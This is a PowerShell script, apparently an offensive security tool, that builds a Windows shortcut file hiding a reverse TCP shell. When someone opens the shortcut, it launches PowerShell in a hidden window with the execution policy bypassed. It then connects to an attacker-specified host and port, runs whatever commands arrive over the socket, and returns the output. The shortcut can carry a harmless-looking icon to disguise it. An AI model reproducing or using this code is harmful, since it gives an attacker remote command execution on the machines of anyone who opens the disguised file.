<#
.SYNOPSIS
Creates an LNK file with an embedded reverse tcp shell. Original code from
http://onready.me/old_horse_attacks.html. The Command parameter can be modified,
but there's a 1023-character limit on the length of the $Shortcut.Arguments property.

.PARAMETER ComputerName
Target for the reverse shell.

.PARAMETER Port
Target port on ComputerName. Defaults to 4444.

.PARAMETER Path
Target for created shortcut. Defaults to script directory.

.PARAMETER Output
File name for shortcut. Must end in lnk. Defaults to 'payload.lnk'.

.PARAMETER Application
Application to run after launching. Will update shortcut icon to match. Defaults to none.

.EXAMPLE
PS> New-LNKShell -ComputerName 192.168.1.1 -Port 4444 -Application calc.exe
#>

[CmdletBinding()]
Param (
    [ValidateRange(1,65535)]
    [int]
    $Port = 4444,
    [Parameter(Mandatory = $True)]
    [string]
    $ComputerName,
    [ValidateScript({$_.Substring($_.length -4) -eq '.lnk'})]
    [string]
    $Output = 'payload.lnk',
    [string]
    $Application = '%SystemRoot%\System32\Shell32.dll,21',
    [ValidateScript({Test-Path -Path $_})]
    [string]
    $Path = (Join-Path -Path (Split-Path -Parent -Path $MyInvocation.MyCommand.Definition) -ChildPath $Output)
)

$Command = @"
"$Application;`$Client = New-Object System.Net.Sockets.TCPClient('$ComputerName', $Port);`$Stream = `$Client.GetStream();[byte[]]`$Bytes = 0..255|%{0};while((`$i = `$Stream.Read(`$Bytes, 0, `$Bytes.Length)) -ne 0){;`$Data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$Bytes,0, `$i);`$SendBack = (iex `$Data 2>&1 | Out-String );`$SendBack2  = `$SendBack + 'PS ' + (pwd).Path + '> ';`$SendByte = ([Text.Encoding]::ASCII).GetBytes(`$SendBack2);`$Stream.Write(`$SendByte,0,`$SendByte.Length);`$Stream.Flush()};`$Client.Close();"
"@

Write-Host "[*] Creating shortcut (${ComputerName}:$Port)"
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($Path)
$Shortcut.TargetPath = '%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe'
$Shortcut.IconLocation = $Application
$Shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command $Command"
$Shortcut.Save()
Write-Host "[*] Shortcut created: $Path"
